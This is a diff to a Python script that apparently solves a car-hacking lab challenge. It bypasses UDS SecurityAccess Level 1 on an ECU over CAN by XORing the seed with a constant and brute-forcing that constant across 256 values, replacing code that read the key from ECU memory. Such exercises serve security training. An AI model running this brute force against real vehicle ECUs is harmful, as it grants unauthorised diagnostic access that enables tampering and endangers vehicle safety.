@@ -3,26 +3,28 @@ import isotp
 from can_uds.comm import create_socket
 from can_uds.uds import (
     SecurityAccess,
-    read_memory_by_addr,
     reset_ecu,
 )
 
 
-def start_level1(sock: isotp.socket):
+def calc_key(seed: bytes, xor_by: int) -> bytes:
+    key = int.from_bytes(seed, "big") & 0xFFFFFFFF
+    key ^= xor_by
+    return key.to_bytes(4, "big")
+
+
+def solve_level1(sock: isotp.socket, xor_by: int):
     sec_access = SecurityAccess(sock, 0x01)
     seed = sec_access.request_seed()
     assert len(seed) == 4
     print(f"[level1] Seed: {seed.hex()}")
 
-    # アドレス 0x1ac08 にキーが書かれている。
-    key = b""
-    for _addr, data in read_memory_by_addr(sock, 0x1AC08, 4):
-        key += data
-    assert len(key) == 4
-    print(f"[level1] Key: {key.hex()}")
-
+    key = calc_key(seed, xor_by)
+    print(f"[level1] Key: {key.hex()} (xor_by = {xor_by})")
     ret = sec_access.send_key(key)
-    assert ret, "Security Access Level1 failed"
+    if ret:
+        print(f"[level1] Security Access Level1 succeeded (xor_by = {xor_by})")
+        return True
 
 
 if __name__ == "__main__":
@@ -30,4 +32,6 @@ if __name__ == "__main__":
     reset_ecu(sock)
     time.sleep(3.0)
 
-    start_level1(sock)
+    for xor_by in range(0x100):
+        if solve_level1(sock, xor_by):
+            break
